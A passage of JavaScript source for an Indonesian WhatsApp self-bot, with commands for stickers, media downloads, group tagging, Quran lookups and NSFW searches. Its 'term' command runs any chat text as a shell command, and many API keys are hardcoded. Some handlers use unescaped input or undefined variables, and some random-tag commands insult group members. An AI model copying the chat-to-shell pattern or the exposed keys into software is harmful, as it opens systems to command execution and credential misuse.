              console.log("Finish");
              itsmevall.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              itsmevall.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`
          );
        }
        break;
      case "toimg":
      case "Toimg":
        if (!isQuotedSticker) return reply("๐ฅ๐ฒ๐ฝ๐น๐/๐๐ฎ๐ด ๐๐๐ถ๐ฐ๐ธ๐ฒ๐ฟ !");
        reply(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await itsmevall.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".png");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return reply("Yah gagal, coba ulangi ^_^");
          buffer = fs.readFileSync(ran);
          fakethumb(buffer, `Ni Kak ${pushname}`);
          fs.unlinkSync(ran);
        });
        break;
      case "ytsearch":
      case "Ytsearch":
        if (args.length < 1) return reply("Tolong masukan query!");
        var srch = args.join("");
        try {
          var aramas = await yts(srch);
        } catch {
          return await itsmevall.sendMessage(
            from,
            "Error!",
            MessageType.text,
            dload
          );
        }
        aramat = aramas.all;
        var tbuff = await getBuffer(aramat[0].image);
        var ytresult = "";
        ytresult += "ใ *YOUTUBE SEARCH* ใ";
        ytresult += "\n________________________\n\n";
        aramas.all.map((video) => {
          ytresult += "โ Title: " + video.title + "\n";
          ytresult += "โ Link: " + video.url + "\n";
          ytresult += "โ Durasi: " + video.timestamp + "\n";
          ytresult +=
            "โ Upload: " + video.ago + "\n________________________\n\n";
        });
        ytresult += "โฉ *SELF-BOT*";
        await fakethumb(tbuff, ytresult);
        break;
      case "setreply":
      case "Setreply":
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        fakegroup(`Succes Mengganti Conversation Fake : ${q}`);
        break;
      case "setfakeimg":
      case "Setfakeimg":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await itsmevall.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "setthumb":
      case "Setthumb":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await itsmevall.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "ytmp4":
      case "Ytmp4":
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`);
        let isLinks2 = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks2) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          ytv(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 40000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captionsYtmp4);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "emoji":
      case "Emoji":
        if (!q) return fakegroup("emojinya?");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        break;
      case "ytmp3":
      case "Ytmp3":
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`);
        let isLinks = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          yta(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 30000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captions);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "image":
      case "gimage":
      case "googleimage":
      case "Image":
      case "Gimage":
      case "Googleimage":
        if (args.length < 1) return reply("Apa Yang Mau Dicari?");
        reply(mess.wait);
        teks = args.join(" ");
        res = await gis(teks, google);
        function google(error, result) {
          if (error) {
            return reply(
              "_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_"
            );
          } else {
            gugIm = result;
            random = gugIm[Math.floor(Math.random() * gugIm.length)].url;
            sendMediaURL(from, random);
          }
        }
        break;

      case "brainly":
      case "Brainly":
        if (args.length < 1) return reply("Pertanyaan apa");
        brien = args.join(" ");
        brainly(`${brien}`).then((res) => {
          teks = "โโโโโโโโโโโโโโโโโโโโโโโโโ\n";
          for (let Y of res.data) {
            teks += `\n*ใ _BRAINLY_ ใ*\n\n*โธ Pertanyaan:* ${Y.pertanyaan}\n\n*โธ Jawaban:* ${Y.jawaban[0].text}\nโโโโโโโโโโโโโโโโโโโโ\n`;
          }
          itsmevall.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;

      case "igstalk":
      case "Igstalk":
        if (!q) return fakegroup("Usernamenya?");
        ig.fetchUser(`${args.join(" ")}`).then((Y) => {
          console.log(`${args.join(" ")}`);
          ten = `${Y.profile_pic_url_hd}`;
          teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Followers* : ${Y.followers}\n*Following* : ${
            Y.following
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
          sendMediaURL(from, ten, teks);
        });
        break;
      case "fb":
      case "Fb":
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
        
      case "term":
      case "Term":
      if (!mek.key.fromMe) return;
        if (!q) return fakegroup(mess.wrongFormat);
        exec(q, (err, stdout) => {
          if (err) return fakegroup(`Khusus Owner ๐ฟ:~ ${err}`);
          if (stdout) {
            fakegroup(stdout);
          }
        });
        break;
      case "join":
      case "Join":
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return reply("Masukan link group");
          var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
          if (!codeInvite) return fakegroup("pastikan link sudah mekar!");
          var response = await itsmevall.acceptInvite(codeInvite);
          grupinv("SUKSES");
        } catch {
          fakegroup("LINK ERROR!");
        }
        break;
      case "runtime":
      case "test":
      case "Runtime":
      case "Test":
        run = process.uptime();
        teks = `${kyun(run)}`;
        reply(teks);
        break;
      case "speed":
      case "ping":
      case "Speed":
      case "Ping":
        const timestamp = speed();
        const latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          const child = stdout.toString("utf-8");
          const ssd = child.replace(/Memory:/, "Ram:");
          const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
          reply(pingnya);
        });
        break;
    
      case "totag":
      case "Totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await itsmevall.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await itsmevall.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          itsmevall.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "tomp4":
      case "Tomp4":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          ger = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await itsmevall.downloadAndSaveMediaMessage(ger);
          webp2mp4File(owgi).then((res) => {
            sendMediaURL(from, res.result, "Done");
          });
        } else {
          reply("reply stiker");
        }
        fs.unlinkSync(owgi);
        break;
      case "tourl":
      case "Tourl":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedVideo) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedVideo
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          owgi = await itsmevall.downloadMediaMessage(boij);
          res = await upload(owgi);
          reply(res);
        } else {
          reply("kirim/reply gambar/video");
        }
        break;
      case "inspect":
      case "Inspect":
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          if (!q) return reply("masukan link wa");
          cos = args[0];
          var net = cos.split("https://chat.whatsapp.com/")[1];
          if (!net) return reply("pastikan itu link https://whatsapp.com/");
          jids = [];
          let {
            id,
            owner,
            subject,
            subjectOwner,
            desc,
            descId,
            participants,
            size,
            descOwner,
            descTime,
            creation,
          } = await itsmevall.query({
            json: ["query", "invite", net],
            expect200: true,
          });
          let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split("@")[0]}` : "*Owner* : -"}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : "*Desc* : tidak ada"}
*Id desc* : ${descId}
${
  descOwner
    ? `*Desc diubah oleh* : @${descOwner.split("@")[0]}`
    : "*Desc diubah oleh* : -"
}\n*Tanggal* : ${
            descTime ? `${formatDate(descTime * 1000)}` : "-"
          }\n\n*Kontak yang tersimpan*\n`;
          for (let y of participants) {
            par += `> @${y.id.split("@")[0]}\n*Admin* : ${
              y.isAdmin ? "Ya" : "Tidak"
            }\n`;
            jids.push(`${y.id.replace(/@c.us/g, "@s.whatsapp.net")}`);
          }
          jids.push(
            `${owner ? `${owner.replace(/@c.us/g, "@s.whatsapp.net")}` : "-"}`
          );
          jids.push(
            `${
              descOwner
                ? `${descOwner.replace(/@c.us/g, "@s.whatsapp.net")}`
                : "-"
            }`
          );
          itsmevall.sendMessage(from, par, text, {
            quoted: mek,
            contextInfo: { mentionedJid: jids },
          });
        } catch {
          reply("Link error");
        }
        break;
        case 'xnxxsearch2':
case 'xs2':
 case 'Xnxxsearch2':
case 'Xs2':
if (!c) return reply('Nyari Apa?')
pepex = await fetchJson(`https://bx-hunter.herokuapp.com/api/xnxxsearch?query=${c}&apikey=${HunterApi}`)
reply(mess.wait)
pepex = pepex.result
ini_txt = ""
for (var x of pepex) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Info : ${x.info}\n`
ini_txt += `Link : ${x.link}\n\n\n`
}
anu = `${ini_txt}โโโโโโโโโโโโโโโ\n\nโ โช *DOWNLOAD*
โ ${prefix}xvideo [link xvid] = Video`
itsmevall.sendMessage(from, anu, text, {quoted: mek})
break
        case 'meadmin':
        case 'Meadmin':
if (!isGroup) return reply('Khusus Group')
if (!isOwner) return
if (isGroupAdmins) return reply('Lu Dah Admin Om')
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
itsmevall.groupMakeAdmin(from, [sender])
reply('Sukses')
break
case 'jadian':
case 'Jadian':
if (!isGroup) return reply('Khusus Group')
              jds = []
              jdii = groupMembers
              koss = groupMembers
              akuu = jdii[Math.floor(Math.random() * jdii.length)]
              diaa = koss[Math.floor(Math.random() * koss.length)]
              teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  ( ) @${diaa.jid.split('@')[0]} `
              jds.push(akuu.jid)
              jds.push(diaa.jid)
              mentions(teks, jds, true)
              break
       case 'cantik':
       case 'Cantik':
       if (!isGroup) return reply('Khusus Group')
              membr = []
              const mes = groupMembers
              const msk = groupMembers
              const siaps = mes[Math.floor(Math.random() * mes.length)]
              const sips = pushname[Math.floor(Math.random() * msk.length)]
              teks = `*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
              membr.push(siaps.jid)
              mentions(teks, membr, true)
              break
       case 'ganteng':
       case 'Ganteng':
       if (!isGroup) return reply('Khusus Group')
              membr = []
              const nus = groupMembers
              const msl = groupMembers
              const siapss = nus[Math.floor(Math.random() * nus.length)]
              const sipss = pushname[Math.floor(Math.random() * msl.length)]
              teks = `*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`
              membr.push(siapss.jid)
              mentions(teks, membr, true)
              break
       case 'babi':
       case 'Babi':
       if (!isGroup) return reply('Khusus Group')
              membr = []
              const meg = groupMembers
              const mge = groupMembers
              const ba = meg[Math.floor(Math.random() * meg.length)]
              const bi = pushname[Math.floor(Math.random() * mge.length)]
              teks = `*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`
              membr.push(ba.jid)
              mentions(teks, membr, true)
              break
       case 'beban':
       case 'Beban':
       if (!isGroup) return reply('Khusus Group')
              membr = []
              const nge = groupMembers
              const tod = groupMembers
              const beb = nge[Math.floor(Math.random() * nge.length)]
              const an = pushname[Math.floor(Math.random() * tod.length)]
              teks = `*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`
              membr.push(beb.jid)
              mentions(teks, membr, true)
              break
       case 'cekwatak':
       case 'Cekwatak':
       if (!isGroup) return reply('Khusus Group')
              var namao = pushname
              var prfx = await itsmevall.getProfilePicture(sender)
              const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
              const wtk = watak[Math.floor(Math.random() * (watak.length))]
              const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
              const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
              const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
              const sft = sifat[Math.floor(Math.random() * (sifat.length))]
              const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colkyy','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
              const hby = hobby[Math.floor(Math.random() * (hobby.length))]
              const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
              const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
              const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
              const typo = tipe[Math.floor(Math.random() * (tipe.length))]
              await reply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
              break
                     case 'cekmati':
                     case 'Cekmati':
                     if (!isGroup) return reply(mess.only.group)
              if (!q) return reply(mess.wrongFormat)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
case 'tagall':
case 'Tagall':
              if (!isGroup) return reply(mess.only.group)
              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += `=> @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              break
        case 'nekopoicosplay':
        case 'Nekopoicosplay':
        case 'cosplaynekopoi':
        case 'Cosplaynekopoi':
        if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
        if (!isGroup) return reply('Khusus Group')
               try {
               reply(mess.wait)
               bsangbe = await axios.get(`https://api.vhtear.com/nekojavcosplay&apikey=ZetsuBot`)
               bsangbe2 = bsangbe.data
               keluarplay = `*List update Cosplay JAV*\n`
               for (let i = 0; i < bsangbe2.result.length; i++) {
               keluarplay += `\n\n\n*Judul* : ${bsangbe2.result[i].title}\n*Deskripsi* : ${bsangbe2.result[i].detail}\n*Link* : ${bsangbe2.result[i].url}\n`
}
               reply(keluarplay)
               } catch (err) {
               console.log(err)
}
               break
case 'nhentaipdf':
case 'Nhentaipdf':
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
		    
			if (args.length == 0) return reply(`Example: ${prefix + command} 12345`)
			
			henid = args[0]
			
			get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=7ef1e86bd8624c0edd8bd386`)
			
			get_result = get_result.result
			
			ini_buffer = await getBuffer(get_result)
			
			itsmevall.sendMessage(from, ini_buffer, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${henid}.pdf` })
			
			break
            
			case 'nhentaisearch':
			case 'Nhentaisearch':
			if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
           
		    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hamekome`)
			
		    query = args.join(" ")
			
		    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentaisearch?apikey=7ef1e86bd8624c0edd8bd386&query=${query}`)
			
		    get_result = get_result.result
			
		    ini_txt = "Result : \n"
			
		    for (var x of get_result) {
			
		    ini_txt += `Id : ${x.id}\n`
			
		    ini_txt += `Title English : ${x.title_english}\n`
			
		    ini_txt += `Title Japanese : ${x.title_japanese}\n`
			
		    ini_txt += `Native : ${x.title_native}\n`
			
		    ini_txt += `Upload : ${x.date_upload}\n`
			
		    ini_txt += `Page : ${x.page}\n`
			
		    ini_txt += `Favourite : ${x.favourite}\n\n`
			
		    }
			
		    reply(ini_txt)
			
		    break
case 'listsurah':
case 'Listsurah':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = 'List Surah:\n'
                    for (var x in get_result) {
                        ini_txt += `${x}. ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
                case 'alquran':
                case 'Alquran':
                    if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
                    urls = `https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=7ef1e86bd8624c0edd8bd386`
                    quran = await fetchJson(urls)
                    result = quran.result
                    ayat = result.ayat
                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
                    for (var x of ayat) {
                        arab = x.arab
                        nomor = x.ayat
                        latin = x.latin
                        indo = x.indonesia
                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
                    }
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    reply(ini_txt)
                    break
                case 'alquranaudio':
                case 'Alquranaudio':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                    surah = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=7ef1e86bd8624c0edd8bd386`)
                    await itsmevall.sendMessage(from, ini_buffer, audio, { quoted: mek, mimetype: Mimetype.mp4Audio })
                    break
                case 'asmaulhusna':
                case 'Asmaulhusna':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = `No : ${get_result.index}\n`
                    ini_txt += `Latin: ${get_result.latin}\n`
                    ini_txt += `Arab : ${get_result.ar}\n`
                    ini_txt += `Indonesia : ${get_result.id}\n`
                    ini_txt += `English : ${get_result.en}`
                    reply(ini_txt)
                    break
                case 'kisahnabi':
                case 'Kisahnabi':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
                    ini_txt += `Umur : ${get_result.age}\n`
                    ini_txt += `Tempat : ${get_result.place}\n`
                    ini_txt += `Story : \n${get_result.story}`
                    reply(ini_txt)
                    break
                case 'jadwalsholat':
                case 'Jadwalsholat':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=7ef1e86bd8624c0edd8bd386`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.imsak}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    reply(ini_txt)
                    break
case 'zippyshare':
case 'Zippyshare':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www51.zippyshare.com/v/5W0TOBz1/file.html`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/zippyshare?apikey=7ef1e86bd8624c0edd8bd386&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_txt = `File Name : ${ini_url.name_file}\n`
                    ini_txt += `Size : ${ini_url.size}\n`
                    ini_txt += `Date Upload : ${ini_url.date_upload}\n`
                    ini_txt += `Download Url : ${ini_url.download_url}`
                    reply(ini_txt)
                    break
                case 'xhamstersearch':
                case 'Xhamstersearch':
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xhamstersearch?apikey=7ef1e86bd8624c0edd8bd386&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'xhamster':
                case 'Xhamster':
                if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://xhamster.com/videos/party-with-friends-end-in-awesome-fucking-5798407`)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xhamster?apikey=7ef1e86bd8624c0edd8bd386&url=${query}`)
                    get_result = get_result.result
